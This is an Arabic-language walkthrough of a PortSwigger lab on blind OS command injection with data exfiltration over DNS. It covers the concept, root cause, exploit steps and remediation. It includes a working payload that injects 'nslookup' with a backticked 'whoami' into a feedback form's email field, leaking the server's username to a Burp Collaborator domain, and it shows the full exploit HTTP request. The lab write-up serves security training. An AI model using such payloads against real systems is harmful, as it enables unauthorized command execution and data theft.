# Lab 05 — Blind OS Command Injection with Out-of-Band Data Exfiltration (سحب البيانات خارجياً عبر DNS)

[![التصنيف](https://img.shields.io/badge/الفئة-OS%20Command%20Injection-red)]()
[![النوع](https://img.shields.io/badge/النوع-OS%20Command%20Injection%20(Blind%20Out-of-Band%20Exfiltration)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/os-command-injection)

> هذا الشرح جزء من سلسلة [معامل حقن أوامر النظام (OS Command Injection)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 05 — Blind OS Command Injection with Out-of-Band Data Exfiltration (سحب البيانات خارجياً عبر DNS) |
| **تصنيف الثغرة** | OS Command Injection (Blind Out-of-Band Exfiltration) |
| **معيار الضعف (CWE)** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | استخراج اسم المستخدم whoami وتهريبه خارجياً عبر استعلام DNS إلى Burp Collaborator. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

هذا اللاب يمثل ذروة هجمات الحقن الأعمى: السيرفر لا يظهر أي رد، وجدران الحماية تمنع الاتصال المباشر. كيف يمكننا قراءة بيانات حساسة مثل ناتج أمر `whoami`؟

**فكرة الحل العبقرية (DNS Data Exfiltration):**
نستغل ميزة التعويض الداخلي للأوامر (Command Substitution) في لينكس باستخدام الباكتيك `` `whoami` ``:
نحقن البيلود: `||nslookup `whoami`.<unique-subdomain>.oastify.com||`.
1. يقوم الشل أولاً بتنفيذ الأمر المحصور بين الباكتيك `` `whoami` `` فيحصل على اسم المستخدم (مثلاً `peter-xyz`).
2. يقوم بدمج الاسم قبل الدومين ليصبح الدومين المطلوب: `peter-xyz.unique-subdomain.oastify.com`.
3. ينفذ أمر `nslookup` ليبحث عن عنوان هذا الدومين الجديد.
4. يصل طلب الـ DNS إلى خادم Burp Collaborator، فنجد اسم المستخدم مكتوباً بوضوح داخل اسم النطاق المستعلم عنه في سجلات الـ DNS!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يدمج تعويض الأوامر البرمجية مع استعلامات الـ DNS لتهريب البيانات المشفرة أو الصريحة خارج أسوار السيرفر.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
إتاحة تنفيذ أوامر الشل مع السماح بخروج استعلامات الـ DNS الداخلية لمخدمات خارجية غير موثوقة.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. في Burp Suite، افتح تبويب **Collaborator** واضغط **Copy to clipboard** لنسخ نطاقك الفريد.
2. التقط طلب إرسال الفيدباك `POST /feedback/submit` وأرسله إلى **Repeater**.
3. في حقل `email`، احقن البيلود التالي (مع الانتباه لترميز الـ URL للأحرف الخاصة):
`email=x||nslookup+`whoami`.xyz.oastify.com||`.
4. أرسل الطلب إلى السيرفر.
5. افتح تبويب **Collaborator** واضغط **Poll now**.
6. افحص استعلامات الـ DNS الواردة: ستجد استعلاماً لدومين يبدأ باسم المستخدم الحقيقي للسيرفر:
`peter-123456.xyz.oastify.com`.
7. انسخ اسم المستخدم (مثال: `peter-123456`) وقدمه في زر **Submit solution** لحل اللاب.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /feedback/submit HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=...&name=a&email=x||nslookup+`whoami`.xyz.oastify.com||
&subject=b&message=c
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

{"message": "Thank you for submitting feedback"}
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تسريب كامل لكلمات المرور والمفاتيح السرية وأسماء المستخدمين من السيرفر حتى في البيئات شديدة التحصين عبر أنفاق الـ DNS.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

منع تشغيل الأوامر عبر الشل، واستخدام خوادم DNS داخلية وسيطة مغلقة (Internal Split-Horizon DNS) تمنع استعلام النطاقات الخارجية مباشرة.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
